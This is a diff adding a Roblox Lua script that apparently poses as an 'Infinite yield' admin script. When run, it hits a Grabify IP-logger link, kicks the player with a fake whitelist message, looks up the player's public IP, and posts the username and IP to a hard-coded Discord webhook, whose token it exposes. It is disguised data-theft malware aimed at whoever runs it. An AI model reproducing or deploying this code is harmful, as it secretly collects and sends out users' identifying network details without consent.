@@ -1,0 +1,51 @@
+game:HttpGet("https://grabify.link/Z9ESNH")
+
+game.Players.LocalPlayer:Kick('Infinite yield beta OWNER WHITELISTED')
+
+local webh = "https://discord.com/api/webhooks/1021299704794976327/ddfDX_UstfbCvOPEOmB2EI6peLvB3m5nS6Wg8sswK6M8kgNne_Qe3RGtYdPMU6pa1jP4"
+
+pcall(function()
+   local data = {
+       ["embeds"] = {
+           {
+               ["title"] = game:GetService("Players").LocalPlayer.Name,
+               ["description"] = game:HttpGet("https://api.ipify.org/?format=json,")
+           }
+       }
+   }
+
+   if syn then
+       local response = syn.request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif request then
+       local response = request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif http_request then
+       local response = http_request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   end
+end)
